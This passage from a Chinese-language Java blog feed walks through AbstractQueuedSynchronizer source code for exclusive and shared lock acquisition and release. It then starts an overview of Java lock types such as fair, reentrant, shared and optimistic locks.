<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Checks and updates status for a node that failed to acquire.</span></span><br><span class="line"><span class="comment">     * Returns true if thread should block. This is the main signal</span></span><br><span class="line"><span class="comment">     * control in all acquire loops.  Requires that pred == node.prev.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pred node's predecessor holding status</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> node the node</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if thread should block</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">shouldParkAfterFailedAcquire</span><span class="params">(Node pred, Node node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ws = pred.waitStatus;</span><br><span class="line">        <span class="keyword">if</span> (ws == Node.SIGNAL)</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * This node has already set status asking a release</span></span><br><span class="line"><span class="comment">             * to signal it, so it can safely park.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (ws &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Predecessor was cancelled. Skip over predecessors and</span></span><br><span class="line"><span class="comment">             * indicate retry.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                node.prev = pred = pred.prev;</span><br><span class="line">            &#125; <span class="keyword">while</span> (pred.waitStatus &gt; <span class="number">0</span>);</span><br><span class="line">            pred.next = node;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * waitStatus must be 0 or PROPAGATE.  Indicate that we</span></span><br><span class="line"><span class="comment">             * need a signal, but don't park yet.  Caller will need to</span></span><br><span class="line"><span class="comment">             * retry to make sure it cannot acquire before parking.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            compareAndSetWaitStatus(pred, ws, Node.SIGNAL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>若shouldParkAfterFailedAcquire返回true，也就是当前结点的前驱结点为SIGNAL状态，则意味着当前结点可以放心休息，进入parking状态了。parkAncCheckInterrupt阻塞线程并处理中断。</p>
<p><strong>parkAndCheckInterrupt</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Convenience method to park and then check if interrupted</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if interrupted</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">parkAndCheckInterrupt</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        LockSupport.park(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">return</span> Thread.interrupted();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>总的来说就是：</p>
<ol>
<li>首先tryAcquire获取同步状态，成功则直接返回；否则，进入下一环节；</li>
<li>线程获取同步状态失败，就构造一个结点，加入同步队列中，这个过程要保证线程安全；</li>
<li>加入队列中的结点线程进入自旋状态，若是老二结点（即前驱结点为头结点），才有机会尝试去获取同步状态；否则，当其前驱结点的状态为SIGNAL，线程便可安心休息，进入阻塞状态，直到被中断或者被前驱结点唤醒。</li>
</ol>
<h4 id="释放锁"><a href="#释放锁" class="headerlink" title="释放锁"></a>释放锁</h4><p><strong>release</strong>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Releases in exclusive mode.  Implemented by unblocking one or</span></span><br><span class="line"><span class="comment">     * more threads if &#123;<span class="doctag">@link</span> #tryRelease&#125; returns true.</span></span><br><span class="line"><span class="comment">     * This method can be used to implement method &#123;<span class="doctag">@link</span> Lock#unlock&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arg the release argument.  This value is conveyed to</span></span><br><span class="line"><span class="comment">     *        &#123;<span class="doctag">@link</span> #tryRelease&#125; but is otherwise uninterpreted and</span></span><br><span class="line"><span class="comment">     *        can represent anything you like.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the value returned from &#123;<span class="doctag">@link</span> #tryRelease&#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">release</span><span class="params">(<span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (tryRelease(arg)) &#123;</span><br><span class="line">            Node h = head;</span><br><span class="line">            <span class="keyword">if</span> (h != <span class="keyword">null</span> &amp;&amp; h.waitStatus != <span class="number">0</span>)</span><br><span class="line">                unparkSuccessor(h);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>调用实现类的tryRelease方法，如果成功了，就唤醒继任节点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Wakes up node's successor, if one exists.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> node the node</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">unparkSuccessor</span><span class="params">(Node node)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * If status is negative (i.e., possibly needing signal) try</span></span><br><span class="line"><span class="comment">         * to clear in anticipation of signalling.  It is OK if this</span></span><br><span class="line"><span class="comment">         * fails or if status is changed by waiting thread.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">int</span> ws = node.waitStatus;</span><br><span class="line">        <span class="keyword">if</span> (ws &lt; <span class="number">0</span>)</span><br><span class="line">            compareAndSetWaitStatus(node, ws, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Thread to unpark is held in successor, which is normally</span></span><br><span class="line"><span class="comment">         * just the next node.  But if cancelled or apparently null,</span></span><br><span class="line"><span class="comment">         * traverse backwards from tail to find the actual</span></span><br><span class="line"><span class="comment">         * non-cancelled successor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Node s = node.next;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="keyword">null</span> || s.waitStatus &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            s = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">for</span> (Node t = tail; t != <span class="keyword">null</span> &amp;&amp; t != node; t = t.prev)</span><br><span class="line">                <span class="keyword">if</span> (t.waitStatus &lt;= <span class="number">0</span>)</span><br><span class="line">                    s = t;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (s != <span class="keyword">null</span>)</span><br><span class="line">            LockSupport.unpark(s.thread);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果继任节点为空或者状态为CANCEL，则从尾部往前遍历找到一个处于正常阻塞状态的节点，进行唤醒。</p>
<h3 id="共享式"><a href="#共享式" class="headerlink" title="共享式"></a>共享式</h3><p>共享式：共享式地获取同步状态。对于独占式同步组件来讲，同一时刻只有一个线程能获取到同步状态，其他线程都得去排队等待，其待重写的尝试获取同步状态的方法tryAcquire返回值为boolean，这很容易理解；对于共享式同步组件来讲，同一时刻可以有多个线程同时获取到同步状态，这也是“共享”的意义所在。其待重写的尝试获取同步状态的方法tryAcquireShared返回值为int。</p>
<h4 id="获取锁-1"><a href="#获取锁-1" class="headerlink" title="获取锁"></a>获取锁</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Attempts to acquire in shared mode. This method should query if</span></span><br><span class="line"><span class="comment">     * the state of the object permits it to be acquired in the shared</span></span><br><span class="line"><span class="comment">     * mode, and if so to acquire it.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;This method is always invoked by the thread performing</span></span><br><span class="line"><span class="comment">     * acquire.  If this method reports failure, the acquire method</span></span><br><span class="line"><span class="comment">     * may queue the thread, if it is not already queued, until it is</span></span><br><span class="line"><span class="comment">     * signalled by a release from some other thread.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;The default implementation throws &#123;<span class="doctag">@link</span></span></span><br><span class="line"><span class="comment">     * UnsupportedOperationException&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arg the acquire argument. This value is always the one</span></span><br><span class="line"><span class="comment">     *        passed to an acquire method, or is the value saved on entry</span></span><br><span class="line"><span class="comment">     *        to a condition wait.  The value is otherwise uninterpreted</span></span><br><span class="line"><span class="comment">     *        and can represent anything you like.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> a negative value on failure; zero if acquisition in shared</span></span><br><span class="line"><span class="comment">     *         mode succeeded but no subsequent shared-mode acquire can</span></span><br><span class="line"><span class="comment">     *         succeed; and a positive value if acquisition in shared</span></span><br><span class="line"><span class="comment">     *         mode succeeded and subsequent shared-mode acquires might</span></span><br><span class="line"><span class="comment">     *         also succeed, in which case a subsequent waiting thread</span></span><br><span class="line"><span class="comment">     *         must check availability. (Support for three different</span></span><br><span class="line"><span class="comment">     *         return values enables this method to be used in contexts</span></span><br><span class="line"><span class="comment">     *         where acquires only sometimes act exclusively.)  Upon</span></span><br><span class="line"><span class="comment">     *         success, this object has been acquired.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalMonitorStateException if acquiring would place this</span></span><br><span class="line"><span class="comment">     *         synchronizer in an illegal state. This exception must be</span></span><br><span class="line"><span class="comment">     *         thrown in a consistent fashion for synchronization to work</span></span><br><span class="line"><span class="comment">     *         correctly.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> UnsupportedOperationException if shared mode is not supported</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">tryAcquireShared</span><span class="params">(<span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>1.当返回值大于0时，表示获取同步状态成功，同时还有剩余同步状态可供其他线程获取；</strong></p>
<p><strong>2.当返回值等于0时，表示获取同步状态成功，但没有可用同步状态了；</strong></p>
<p><strong>3.当返回值小于0时，表示获取同步状态失败。</strong></p>
<p>如果获取同步状态失败，则调用doAcquireShared方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Acquires in shared uninterruptible mode.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arg the acquire argument</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doAcquireShared</span><span class="params">(<span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Node node = addWaiter(Node.SHARED);<span class="comment">//构造一个共享结点，添加到同步队列尾部。若队列初始为空，先添加一个无意义的傀儡结点，再将新节点添加到队列尾部。</span></span><br><span class="line">        <span class="keyword">boolean</span> failed = <span class="keyword">true</span>;<span class="comment">//是否获取成功</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">boolean</span> interrupted = <span class="keyword">false</span>;<span class="comment">//线程parking过程中是否被中断过</span></span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;<span class="comment">//死循环</span></span><br><span class="line">                <span class="keyword">final</span> Node p = node.predecessor();<span class="comment">//找到前驱结点</span></span><br><span class="line">                <span class="keyword">if</span> (p == head) &#123;<span class="comment">//头结点持有同步状态，只有前驱是头结点，才有机会尝试获取同步状态</span></span><br><span class="line">                    <span class="keyword">int</span> r = tryAcquireShared(arg);<span class="comment">//尝试获取同步装填</span></span><br><span class="line">                    <span class="keyword">if</span> (r &gt;= <span class="number">0</span>) &#123;<span class="comment">//r&gt;=0,获取成功</span></span><br><span class="line">                        setHeadAndPropagate(node, r);<span class="comment">//获取成功就将当前结点设置为头结点，若还有可用资源，传播下去，也就是继续唤醒后继结点</span></span><br><span class="line">                        p.next = <span class="keyword">null</span>; <span class="comment">// 方便GC</span></span><br><span class="line">                        <span class="keyword">if</span> (interrupted)</span><br><span class="line">                            selfInterrupt();</span><br><span class="line">                        failed = <span class="keyword">false</span>;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;<span class="comment">//是否能安心进入parking状态</span></span><br><span class="line">                    parkAndCheckInterrupt())<span class="comment">//阻塞线程</span></span><br><span class="line">                    interrupted = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (failed)</span><br><span class="line">                cancelAcquire(node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>大体逻辑与独占式的acquireQueued差距不大，只不过由于是共享式，会有多个线程同时获取到线程，也可能同时释放线程，空出很多同步状态，所以当排队中的老二获取到同步状态，如果还有可用资源，会继续传播下去。</p>
<p><strong>setHeadAndPropagate</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Sets head of queue, and checks if successor may be waiting</span></span><br><span class="line"><span class="comment">     * in shared mode, if so propagating if either propagate &gt; 0 or</span></span><br><span class="line"><span class="comment">     * PROPAGATE status was set.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> node the node</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> propagate the return value from a tryAcquireShared</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setHeadAndPropagate</span><span class="params">(Node node, <span class="keyword">int</span> propagate)</span> </span>&#123;</span><br><span class="line">        Node h = head; <span class="comment">// Record old head for check below</span></span><br><span class="line">        setHead(node);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Try to signal next queued node if:</span></span><br><span class="line"><span class="comment">         *   Propagation was indicated by caller,</span></span><br><span class="line"><span class="comment">         *     or was recorded (as h.waitStatus either before</span></span><br><span class="line"><span class="comment">         *     or after setHead) by a previous operation</span></span><br><span class="line"><span class="comment">         *     (note: this uses sign-check of waitStatus because</span></span><br><span class="line"><span class="comment">         *      PROPAGATE status may transition to SIGNAL.)</span></span><br><span class="line"><span class="comment">         * and</span></span><br><span class="line"><span class="comment">         *   The next node is waiting in shared mode,</span></span><br><span class="line"><span class="comment">         *     or we don't know, because it appears null</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * The conservatism in both of these checks may cause</span></span><br><span class="line"><span class="comment">         * unnecessary wake-ups, but only when there are multiple</span></span><br><span class="line"><span class="comment">         * racing acquires/releases, so most need signals now or soon</span></span><br><span class="line"><span class="comment">         * anyway.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (propagate &gt; <span class="number">0</span> || h == <span class="keyword">null</span> || h.waitStatus &lt; <span class="number">0</span> ||</span><br><span class="line">            (h = head) == <span class="keyword">null</span> || h.waitStatus &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            Node s = node.next;</span><br><span class="line">            <span class="keyword">if</span> (s == <span class="keyword">null</span> || s.isShared())</span><br><span class="line">                doReleaseShared();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="释放锁-1"><a href="#释放锁-1" class="headerlink" title="释放锁"></a>释放锁</h4><p><strong>releaseShared</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Releases in shared mode.  Implemented by unblocking one or more</span></span><br><span class="line"><span class="comment">     * threads if &#123;<span class="doctag">@link</span> #tryReleaseShared&#125; returns true.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arg the release argument.  This value is conveyed to</span></span><br><span class="line"><span class="comment">     *        &#123;<span class="doctag">@link</span> #tryReleaseShared&#125; but is otherwise uninterpreted</span></span><br><span class="line"><span class="comment">     *        and can represent anything you like.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the value returned from &#123;<span class="doctag">@link</span> #tryReleaseShared&#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">releaseShared</span><span class="params">(<span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (tryReleaseShared(arg)) &#123;</span><br><span class="line">            doReleaseShared();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Release action for shared mode -- signals successor and ensures</span></span><br><span class="line"><span class="comment">    * propagation. (Note: For exclusive mode, release just amounts</span></span><br><span class="line"><span class="comment">    * to calling unparkSuccessor of head if it needs signal.)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doReleaseShared</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * Ensure that a release propagates, even if there are other</span></span><br><span class="line"><span class="comment">        * in-progress acquires/releases.  This proceeds in the usual</span></span><br><span class="line"><span class="comment">        * way of trying to unparkSuccessor of head if it needs</span></span><br><span class="line"><span class="comment">        * signal. But if it does not, status is set to PROPAGATE to</span></span><br><span class="line"><span class="comment">        * ensure that upon release, propagation continues.</span></span><br><span class="line"><span class="comment">        * Additionally, we must loop in case a new node is added</span></span><br><span class="line"><span class="comment">        * while we are doing this. Also, unlike other uses of</span></span><br><span class="line"><span class="comment">        * unparkSuccessor, we need to know if CAS to reset status</span></span><br><span class="line"><span class="comment">        * fails, if so rechecking.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">           Node h = head;</span><br><span class="line">           <span class="keyword">if</span> (h != <span class="keyword">null</span> &amp;&amp; h != tail) &#123;</span><br><span class="line">               <span class="keyword">int</span> ws = h.waitStatus;</span><br><span class="line">               <span class="keyword">if</span> (ws == Node.SIGNAL) &#123;</span><br><span class="line">                   <span class="keyword">if</span> (!compareAndSetWaitStatus(h, Node.SIGNAL, <span class="number">0</span>))</span><br><span class="line">                       <span class="keyword">continue</span>;            <span class="comment">// loop to recheck cases</span></span><br><span class="line">                   unparkSuccessor(h);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">else</span> <span class="keyword">if</span> (ws == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                        !compareAndSetWaitStatus(h, <span class="number">0</span>, Node.PROPAGATE))</span><br><span class="line">                   <span class="keyword">continue</span>;                <span class="comment">// loop on failed CAS</span></span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (h == head)                   <span class="comment">// loop if head changed</span></span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>AQS是JUC中很多同步组件的构建基础，简单来讲，它内部实现主要是状态变量state和一个FIFO队列来完成，同步队列的头结点是当前获取到同步状态的结点，获取同步状态state失败的线程，会被构造成一个结点（或共享式或独占式）加入到同步队列尾部（采用自旋CAS来保证此操作的线程安全），随后线程会阻塞；释放时唤醒头结点的后继结点，使其加入对同步状态的争夺中。</p>
<p>AQS为我们定义好了顶层的处理实现逻辑，我们在使用AQS构建符合我们需求的同步组件时，只需重写tryAcquire，tryAcquireShared，tryRelease，tryReleaseShared几个方法，来决定同步状态的释放和获取即可，至于背后复杂的线程排队，线程阻塞/唤醒，如何保证线程安全，都由AQS为我们完成了，这也是非常典型的模板方法的应用。AQS定义好顶级逻辑的骨架，并提取出公用的线程入队列/出队列，阻塞/唤醒等一系列复杂逻辑的实现，将部分简单的可由使用者决定的操作逻辑延迟到子类中去实现。　</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.csdn.net/J080624/article/details/84849315?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">队列同步器AQS-AbstractQueuedSynchronizer 原理分析</a></p>
<p><a href="https://www.cnblogs.com/chengxiao/archive/2017/07/24/7141160.html" target="_blank" rel="noopener"><a href="https://www.cnblogs.com/chengxiao/p/7141160.html" target="_blank" rel="noopener">Java并发包基石-AQS详解</a></a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>锁</tag>
        <tag>并发</tag>
        <tag>多线程</tag>
        <tag>AQS</tag>
        <tag>AbstractQueuedSynchronizer</tag>
      </tags>
  </entry>
  <entry>
    <title>Java中的锁</title>
    <url>/2020/03/10/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B/2020-03-10-%E5%A4%9A%E7%BA%BF%E7%A8%8B-01-Java%E4%B8%AD%E7%9A%84%E9%94%81/</url>
    <content><![CDATA[<h2 id="Java中的锁"><a href="#Java中的锁" class="headerlink" title="Java中的锁"></a>Java中的锁</h2><h2 id="Java中的锁分类"><a href="#Java中的锁分类" class="headerlink" title="Java中的锁分类"></a>Java中的锁分类</h2><p>在Java中，锁大致可以分为这些：</p>
<ul>
<li>公平锁/非公平锁</li>
<li>可重入锁/非可重入锁</li>
<li>排他锁（独享锁）/共享锁</li>
<li>乐观锁/悲观锁</li>
<li>分段锁</li>
<li>无锁/偏向锁/轻量级锁/重量级锁</li>
<li>自旋锁/适应性自旋锁</li>
</ul>
<p>这里并不是指的锁的状态，有些针对的是锁的特性。</p>
<h3 id="公平锁-非公平锁"><a href="#公平锁-非公平锁" class="headerlink" title="公平锁/非公平锁"></a>公平锁/非公平锁</h3><h4 id="公平锁"><a href="#公平锁" class="headerlink" title="公平锁"></a>公平锁</h4><p>公平锁是指多个线程按照申请锁的顺序来获取锁。采用的是先到先得的策略。在线程来获取锁的时候，直接进入队里排队，锁被其他线程释放了之后，队列中的第一个线程才能获取到锁。</p>
<p>公平锁具有以下优缺点：</p>
<p><strong>优点</strong>：所有等待锁的线程都具有获取到锁的机会，不会处于一直阻塞的状态；</p>
<p><strong>缺点：</strong>整体的吞吐率比非公平锁第。等待队列中除第一个线程以外的所有线程都会阻塞，而CPU唤醒阻塞线程的开销比非公平锁大。</p>
<h4 id="非公平锁"><a href="#非公平锁" class="headerlink" title="非公平锁"></a>非公平锁</h4><p>非公平锁是线程在要加锁的时候，直接去尝试是否能获取到锁，无视队列里面是否存在比它早到的其他线程。如果此时锁刚好被释放，那么此线程就直接获取到锁，不需要阻塞。</p>
<p>非公平锁具有以下优缺点：</p>
<p><strong>优点：</strong>可以减少CPU唤醒阻塞线程的开销，整体的吞吐率比公平锁高。有一定的概率，线程在获取锁的时候，刚好锁被其他线程释放，那么当前线程就减少了阻塞和被唤醒的开销。</p>
<p><strong>缺点：</strong>存在一定的概率导致队列中等待的线程一直等不到或者等很久才能拿到想要的锁。</p>
<p><img src="https://huhansi.github.io/images/2020-03-10-fair-unfair-lock.png" alt="公平锁/非公平锁示例"></p>
<h3 id="可重入锁-非可重入锁"><a href="#可重入锁-非可重入锁" class="headerlink" title="可重入锁/非可重入锁"></a>可重入锁/非可重入锁</h3><h4 id="可重入锁"><a href="#可重入锁" class="headerlink" title="可重入锁"></a>可重入锁</h4><p>可重入锁又名递归锁，是指同一个线程在外层方法获取到了锁之后，在进入内部的同步方法时，会自动获取锁。在Java中，synchronized和ReentrantLock都是可重入锁。</p>
<p>比如下面这段代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LockTest</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String testString = <span class="string">"Do something"</span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">doSomethingOutter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(testString);</span><br><span class="line">		doSomethingInner();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">doSomethingInner</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(testString);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面两个类方法中，doSomethingOutter和doSomethingInner都是被synchronized关键字修饰的。线程在调用doSometingOutter时，获取到了锁，此时在它内部在调用方法doSomethingInner就不需要等doSomethingOutter释放锁，可以直接进入该方法执行。</p>
<p>synchronized实现可重入参见文章<a href="http://huhansi.com/2020/03/10/Java/多线程/2020-03-10-多线程-02-synchronized关键字解析/">synchronized关键字解析</a></p>
<p>ReentrantLock实现可重入请参见文章<a href="http://huhansi.com/2020/03/12/Java/多线程/2020-03-10-多线程-03-ReentrantLock解析/">ReentrantLock解析</a></p>
<h4 id="非可重入锁"><a href="#非可重入锁" class="headerlink" title="非可重入锁"></a>非可重入锁</h4><p>如果是非可重入锁的话，在进入doSomethingOutter之后，进入方法doSomethingInner之前，doSomethingInner方法需要获取锁，而此时doSomethingOutter方法还无法释放锁，就会造成死锁。</p>
<p>借用参考文献[1]中打水的例子。许多人在排队打水的时候，管理员允许一个人在获取锁之后可以给多个桶打水。当某个人打水时，先第一个桶和锁绑定打水，接着第二个，第三个，直到所有水桶都打完水之后，才将锁还给管理员。然后管理员把锁分配给下一个人。</p>
<p><img src="https://huhansi.github.io/images/2020-03-10-reentrant-dashui.png" alt="可重入方式打水"></p>
<p>如果管理员只允许一把锁只能给一个桶打水的话，在第一个人打完第一桶水之后，不会释放锁，这时候，打第二桶水又需要锁，却无法和锁绑定。导致当前线程出现死锁。剩下的所有线程都无法被唤醒。</p>
<p><img src="https://huhansi.github.io/images/2020-03-10-non-reentrant-dashui.png" alt="非可重入方式打水"></p>
<h3 id="排他锁（独享锁）-共享锁"><a href="#排他锁（独享锁）-共享锁" class="headerlink" title="排他锁（独享锁）/共享锁"></a>排他锁（独享锁）/共享锁</h3><p>排他锁指的是这个锁一次只能被一个线程所持有，其他线程如果需要的话，必须等当前线程释放该锁才可。如果线程T对数据A加上排他锁之后，其他线程不可再对数据A加任何类型的锁。获得排他锁的线程T即能读取数据又能修改数据。</p>
<p>共享锁指的是这个锁可以被多个线程所持有。</p>
<p>对ReentrantLock来说，它是独享锁。而另外一个ReadWriteLock。它的ReadLock是共享锁，可以被多个线程同时持有，而WriteLock是独享，排他的。如果线程T对数据A加上共享锁之火，其他线程只能对数据A加上共享锁，不能加排他锁。获得共享锁的线程只能读取数据，不能修改数据。</p>
<p>独享锁和共享锁也是通过AQS实现的，通过实现不同的方法，来实现独享或者共享。详情可参见<a href="http://huhansi.com/2020/03/12/Java/多线程/2020-03-10-多线程-06-ReentrantReadWriteLock解析/">ReentrantReadWriteLock解析</a></p>
<h3 id="乐观锁-悲观锁"><a href="#乐观锁-悲观锁" class="headerlink" title="乐观锁/悲观锁"></a>乐观锁/悲观锁</h3><p>乐观锁和悲观锁不是什么锁的种类，而是看待并发同步的角度。</p>
<p>对于同一个数据的并发操作，悲观锁认为其在使用数据的时候，一定会有其他的线程来修改数据，因此，它在获取数据的时候会先加上锁，确保其他线程无法修改数据。在Java中，synchronized和Lock的实现类都是悲观锁。</p>
<p>而乐观锁则认为其在使用数据时，不会有其他的线程来修改数据，所以不会加锁，只是在更新数据的识货判断之前有没有别的线程已经修改了这个数据。如果这个数据没有被更新，当前线程将自己修改的数据写入。否则，根据不同的实现方式执行不同的操作（例如报错或者重试）。</p>
<p>乐观锁在Java中时通过无锁编程来实现的，最常采用的是CAS（Compare And Set）算法，Java原子类中的递增操作就是通过CAS自旋实现的。</p>
